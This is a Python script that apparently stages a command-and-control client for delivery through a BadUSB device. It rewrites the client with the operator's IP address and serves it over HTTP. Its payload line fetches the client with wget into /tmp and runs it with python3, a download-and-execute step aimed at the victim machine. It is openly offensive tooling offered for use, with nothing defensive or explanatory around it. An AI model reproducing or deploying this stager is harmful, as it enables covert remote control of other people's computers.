import os
import socket
import socketserver
import re
import http.server
import subprocess
import shutil

# Step 1: Replace IP_HOST in client.py with your local IP address
client_py_path = os.path.join(os.path.dirname(__file__), "Base-C2/client.py")

# Get your local IP address by parsing ifconfig output

def get_local_ip():
    ifconfig_output = subprocess.check_output("ifconfig", shell=True).decode("utf-8")
    match = re.search(r'192\.168\.\d+\.\d+', ifconfig_output)
    if match:
        return match.group(0)
    else:
        raise RuntimeError("Local IP address not found in ifconfig output")

local_ip = get_local_ip()

shutil.copyfile(client_py_path, os.path.join(os.path.dirname(__file__), "client_r.py"))
client_py_path = os.path.join(os.path.dirname(__file__), "client_r.py")
# Read and replace IP_HOST in client.py
with open(client_py_path, "r") as f:
    content = f.read()

content_new = re.sub(r'IP_HOST', f'"{local_ip}"', content)

with open(client_py_path, "w") as f:
    f.write(content_new)

# change the payload of the badusb

badusb_payload = "wget http://{local_ip}:8000/client_r.py -O /tmp/client_r.py && python3 /tmp/client_r.py"

# check if the usb is mounted
usb_mount_path = "/media/usb"


# Step 2: Serve only client.py via HTTP
class SingleFileHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def list_directory(self, path):
        self.send_error(403, "Directory listing not allowed")
        return None

    def do_GET(self):
        if self.path == "/client_r.py":
            super().do_GET()
            print("File retrieved, shutting down server...")
            # Shut down the server
            exit(0)
        else:
            self.send_error(404, "File not found")

if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    PORT = 8000
    Handler = SingleFileHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving client_r.py at http://{local_ip}:{PORT}/client_r.py")
        httpd.serve_forever()